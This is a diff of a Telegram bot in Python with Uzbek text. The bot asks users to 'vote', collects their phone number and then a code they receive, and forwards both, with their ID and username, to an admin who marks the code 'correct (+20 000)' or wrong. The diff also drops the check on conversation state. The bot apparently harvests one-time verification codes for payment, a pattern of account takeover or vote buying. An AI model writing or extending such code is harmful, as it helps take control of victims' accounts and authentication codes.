@@ -236,7 +236,7 @@ async def vote_start(message: types.Message):
         parse_mode="HTML"
     )
 
-# ================= 3. TELEFON RAQAM (Kontakt) =================
+# ================= 3. TELEFON RAQAM (Kontakt) - Tuzatilgan =================
 @dp.message(lambda msg: msg.contact is not None)
 async def receive_phone_contact(message: types.Message):
     telegram_id = message.from_user.id
@@ -245,9 +245,15 @@ async def receive_phone_contact(message: types.Message):
         await message.answer("❌ Siz adminsiz, kontakt yubora olmaysiz!")
         return
     
-    if user_states.get(telegram_id) != "waiting_phone":
-        await message.answer("❌ Iltimos, /start yoki 🗳️ Ovoz berish tugmasini bosing!")
-        return
+    # Avtomatik holatga o'tkazish
+    current_state = user_states.get(telegram_id)
+    if current_state != "waiting_phone":
+        logger.info(f"👤 Holat o'zgartirildi: {current_state} → waiting_phone ({telegram_id})")
+        user_states[telegram_id] = "waiting_phone"
+        await message.answer(
+            "📱 Telefon raqamingiz qabul qilindi!",
+            reply_markup=types.ReplyKeyboardRemove()
+        )
     
     phone = message.contact.phone_number
     await process_phone(message, phone)
@@ -321,7 +327,7 @@ async def process_phone(message: types.Message, phone: str):
     except Exception as e:
         logger.error(f"❌ Admin'ga yuborishda xatolik: {e}")
 
-# ================= 5. KODNI QABUL QILISH (ADMINGA BORISHI KERAK) =================
+# ================= 5. KODNI QABUL QILISH =================
 @dp.message(lambda msg: user_states.get(msg.from_user.id) == "waiting_code")
 async def receive_code(message: types.Message):
     code = message.text.strip()
@@ -358,43 +364,37 @@ async def receive_code(message: types.Message):
         reply_markup=user_menu
     )
     
-    # ADMINGA XABAR YUBORISH (MUHIM QISM)
+    # ADMINGA XABAR YUBORISH
     try:
         user_info = await bot.get_chat(telegram_id)
         username = user_info.username if user_info.username else "mavjud_emas"
         
-        # 2 TUGMA (tasdiqlash va rad etish)
+        # 2 TUGMA
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
             InlineKeyboardButton(text="✅ To'g'ri kod (+20 000)", callback_data=f"verify_{telegram_id}_{phone}_{code}"),
             InlineKeyboardButton(text="❌ Noto'g'ri kod", callback_data=f"reject_{telegram_id}")
         )
         
-        # Admin xabari
-        admin_text = (
+        await bot.send_message(
+            ADMIN_ID,
             f"🔑 <b>KOD TEKSHIRISH KERAK</b>\n\n"
             f"👤 <b>Foydalanuvchi:</b> <a href='tg://user?id={telegram_id}'>🔗 Profilga o'tish</a>\n"
             f"🆔 ID: <code>{telegram_id}</code>\n"
             f"📞 Telefon: <code>{phone}</code>\n"
             f"🔑 Kod: <code>{code}</code>\n"
-            f"👤 Username: @{username}"
-        )
-        
-        await bot.send_message(
-            ADMIN_ID,
-            admin_text,
+            f"👤 Username: @{username}",
             reply_markup=keyboard,
             parse_mode="HTML"
         )
-        logger.info(f"✅ Admin xabari yuborildi (kod): {telegram_id} - {code}")
+        logger.info(f"✅ Admin xabari yuborildi (kod): {telegram_id}")
         
     except Exception as e:
         logger.error(f"❌ Admin'ga kod yuborishda xatolik: {e}")
-        # Xatolik haqida admin ga xabar
         try:
             await bot.send_message(
                 ADMIN_ID,
-                f"❌ Xatolik: {e}\nTelegram ID: {telegram_id}\nKod: {code}"
+                f"❌ Xatolik: {e}\nID: {telegram_id}\nKod: {code}"
             )
         except:
             pass
